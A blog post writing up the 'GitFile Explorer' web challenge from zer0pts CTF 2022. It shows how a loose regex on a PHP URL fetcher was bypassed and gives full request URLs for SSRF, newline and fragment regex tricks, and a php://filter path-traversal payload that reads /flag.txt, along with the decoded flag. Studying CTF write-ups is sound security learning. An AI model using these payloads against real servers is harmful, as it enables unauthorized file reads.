---
layout: post
title: zer0pts CTF 2022 Writeup
published: true
categories: [Web]
excerpt: I debated doing a writeup for this since I only worked on the easiest web challenge with my team, but since this blog needed an update I am publishing it.
---

I debated doing a writeup for this since I only worked on the easiest web challenge with my team, but since this blog needed an update I am publishing it.

---

## Web

---

# GitFile Explorer

#### Category: Web | 77 points

<details>
  <summary>Challenge Description</summary>
  
  Read /flag.txt on the server.     
	http://gitfile.ctf.zer0pts.com:8001/
</details>

The source code was given for this challenge, so no guessing was required.

First, I tried to understand the application by clicking on the Download button on the Challenge URL, which returns the following URL: [http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fraw.githubusercontent.com&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md](http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fraw.githubusercontent.com&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md)


Looking at the source code, we see that the URL is generated as follows:

```php
$service = empty($_GET['service']) ? "" : $_GET['service'];
$owner   = empty($_GET['owner'])   ? "ptr-yudai" : $_GET['owner'];
$repo    = empty($_GET['repo'])    ? "ptrlib"    : $_GET['repo'];
$branch  = empty($_GET['branch'])  ? "master"    : $_GET['branch'];
$file    = empty($_GET['file'])    ? "README.md" : $_GET['file'];

if ($service) {
    $url = craft_url($service, $owner, $repo, $branch, $file);
    if (preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", $url) === 1) {
        $result = file_get_contents($url);
    }
}
```


It is immediately obvious that the regex is very loose. Since the regex only checks for presence of `github` or `gitlab` or `bitbucket` in the URL, the full hostname is not actually needed and we just need to include it somewhere in our `service` parameter. 

An SSRF can be achieved by putting an `@` after the hostname to redirect to our chosen domain, such as [http://gitfile.ctf.zer0pts.com:8001/?service=http%3A%2F%2Fraw.githubusercontent.@gitfile.ctf.zer0pts.com:8001&owner=.&repo=.&branch=.&file=index.php](http://gitfile.ctf.zer0pts.com:8001/?service=http%3A%2F%2Fraw.githubusercontent.@gitfile.ctf.zer0pts.com:8001&owner=.&repo=.&branch=.&file=index.php) would return the contents of `index.php` of the site.

From here I tried path traversal by replacing the `index.php` with `../../../flag.txt` only to be met with the following error:

```markdown
: file_get_contents(http://...@gitfile.ctf.zer0pts.com:8001/./././../../../flag.txt): Failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request in

**/var/www/html/index.php**

on line **30**
```

I got the same error when trying [http://gitfile.ctf.zer0pts.com:8001/?service=http%3A%2F%2Fraw.githubusercontent.@gitfile.ctf.zer0pts.com:8001&owner=..&repo=..&branch=..&file=flag.txt](http://gitfile.ctf.zer0pts.com:8001/?service=http%3A%2F%2Fraw.githubusercontent.@gitfile.ctf.zer0pts.com:8001&owner=..&repo=..&branch=..&file=flag.txt) as well, which should have sent the same request given the code:

```php
$url = craft_url($service, $owner, $repo, $branch, $file);
```

It was here a few of us got stuck for a while, and we started looking for other bypasses.

The following regex bypasses are viable:
- using the newline character `%0A`: [http://gitfile.ctf.zer0pts.com:8001/?service=http://gitfile.ctf.zer0pts.com:8001/%0Ahttp://github&owner=.&repo=.&branch=.&file=flag.txt](http://gitfile.ctf.zer0pts.com:8001/?service=http://gitfile.ctf.zer0pts.com:8001/%0Ahttp://github&owner=.&repo=.&branch=.&file=flag.txt)
- using the URL-encoded fragment identifier `#`: [http://gitfile.ctf.zer0pts.com:8001/?service=http://localhost%23github&owner=.&repo=.&branch=.&file=flag.txt](http://gitfile.ctf.zer0pts.com:8001/?service=http://localhost%23github&owner=.&repo=.&branch=.&file=flag.txt)
- using the query paramter `?=`: [http://gitfile.ctf.zer0pts.com:8001/?service=http://localhost/flag.txt%3Fa%3Dgithub&owner=.&repo=.&branch=.&file=a](http://gitfile.ctf.zer0pts.com:8001/?service=http://localhost/flag.txt%3Fa%3Dgithub&owner=.&repo=.&branch=.&file=a)

We also tried non-HTTP protocols such as:
- File selector `file://`: [http://gitfile.ctf.zer0pts.com:8001/?service=file://flag.txt%0Ahttp://github&owner=.&repo=.&branch=.&file=index.php](http://gitfile.ctf.zer0pts.com:8001/?service=file://flag.txt%0Ahttp://github&owner=.&repo=.&branch=.&file=index.php) which returns `Remote host file access not supported`, meaning that the `file://` wouldn't work.
- PHP Filter `php://filter/convert.base64-encode/resource=`: [http://gitfile.ctf.zer0pts.com:8001/?service=php://filter/convert.base64-encode/resource=flag.txt%0Ahttp://github&owner=..&repo=..&branch=..&file=.](http://gitfile.ctf.zer0pts.com:8001/?service=php://filter/convert.base64-encode/resource=flag.txt%0Ahttp://github&owner=..&repo=..&branch=..&file=.), which returns `Read of 8192 bytes failed with errno=21 Is a directory in /var/www/html/index.php on line 30`, which meant that `resource` was somehow reading a directory instead of the file we specified. 

And thus to no avail.

It was at this point Ocean came in with the brilliant idea of separating the base resource directory as a `/` and specifying the file in the param instead: [http://gitfile.ctf.zer0pts.com:8001/?service=php://filter/convert.base64-encode/resource=/%0ahttp://github&owner=..&repo=..&branch=..&file=flag.txt](http://gitfile.ctf.zer0pts.com:8001/?service=php://filter/convert.base64-encode/resource=/%0ahttp://github&owner=..&repo=..&branch=..&file=flag.txt), which finally led us to the flag.

The content returned was in base64 due to our filter: `emVyMHB0c3tmb28vYmFyLy4uLy4uLy4uLy4uLy4uL2RpcmVjdG9yeS90cmF2ZXJzYWx9Cg==`

Which when decoded, it gives the flag!

<details>
  <summary>FLAG</summary>
  
   zer0pts{foo/bar/../../../../../directory/traversal}
</details>


